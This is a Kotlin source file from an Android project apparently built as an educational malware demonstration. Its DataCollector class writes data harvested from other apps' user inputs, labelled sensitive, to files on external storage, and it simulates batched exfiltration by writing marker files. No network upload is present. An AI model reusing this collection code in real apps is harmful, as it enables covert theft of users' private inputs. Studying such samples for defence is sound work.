package com.example.ChatterBox.malicious

import android.content.Context
import android.os.Environment
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import org.json.JSONObject

/**
 * Utility class to manage collected data and simulate exfiltration.
 * FOR EDUCATIONAL DEMONSTRATION PURPOSES ONLY.
 */
class DataCollector {
    companion object {
        private const val TAG = "DataCollector"
        private const val MAX_FILES_BEFORE_UPLOAD = 10
        
        /**
         * Stores collected data to a local file.
         */
        fun storeData(context: Context, dataType: String, data: String) {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            val filename = "${dataType}_${timestamp}_${UUID.randomUUID().toString().substring(0, 8)}.txt"
            
            try {
                val file = File(getStorageDir(context, dataType), filename)
                FileOutputStream(file).use { out ->
                    out.write(data.toByteArray())
                }
                
                Log.d(TAG, "Stored $dataType data: $filename")
                
                // Check if we should attempt to "upload" data
                checkAndUploadData(context, dataType)
            } catch (e: Exception) {
                Log.e(TAG, "Error storing $dataType data", e)
            }
        }
        
        /**
         * Stores sensitive information from user inputs.
         */
        fun storeSensitiveInfo(context: Context, sourceApp: String, sensitiveData: String, dataType: String) {
            val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
            
            try {
                val jsonData = JSONObject().apply {
                    put("timestamp", timestamp)
                    put("source", sourceApp)
                    put("type", dataType)
                    put("data", sensitiveData)
                }
                
                val sensitiveInfoFile = File(getStorageDir(context, "sensitive"), 
                                         "sensitive_${timestamp}.json")
                
                FileOutputStream(sensitiveInfoFile).use { out ->
                    out.write(jsonData.toString().toByteArray())
                }
                
                Log.d(TAG, "Stored sensitive $dataType from $sourceApp")
            } catch (e: Exception) {
                Log.e(TAG, "Error storing sensitive data", e)
            }
        }
        
        /**
         * Simulates data exfiltration to a remote server.
         * This function just logs the attempt and stores a marker file.
         */
        private fun checkAndUploadData(context: Context, dataType: String) {
            val files = getStorageDir(context, dataType).listFiles() ?: return
            
            if (files.size >= MAX_FILES_BEFORE_UPLOAD) {
                Log.d(TAG, "Attempting to upload ${files.size} $dataType files")
                
                // Simulate upload by creating a marker file
                val uploadMarker = File(getStorageDir(context, "uploads"), 
                                     "upload_${dataType}_${System.currentTimeMillis()}.txt")
                
                try {
                    FileOutputStream(uploadMarker).use { out ->
                        val content = StringBuilder()
                        content.append("SIMULATED DATA UPLOAD\n")
                        content.append("Timestamp: ${Date()}\n")
                        content.append("Data type: $dataType\n")
                        content.append("Files included:\n")
                        
                        files.forEach { file ->
                            content.append("- ${file.name}\n")
                        }
                        
                        out.write(content.toString().toByteArray())
                    }
                    
                    Log.d(TAG, "Simulated upload complete: ${uploadMarker.name}")
                    
                    // In a real scenario, after successful upload, files might be deleted
                    // For this demo, we'll leave them in place
                } catch (e: Exception) {
                    Log.e(TAG, "Error in simulated upload", e)
                }
            }
        }
        
        /**
         * Gets or creates the appropriate storage directory.
         */
        private fun getStorageDir(context: Context, dataType: String): File {
            val baseDir = File(Environment.getExternalStorageDirectory(), "ChatterBox/collected_data/$dataType")
            if (!baseDir.exists()) {
                baseDir.mkdirs()
            }
            return baseDir
        }
    }
}
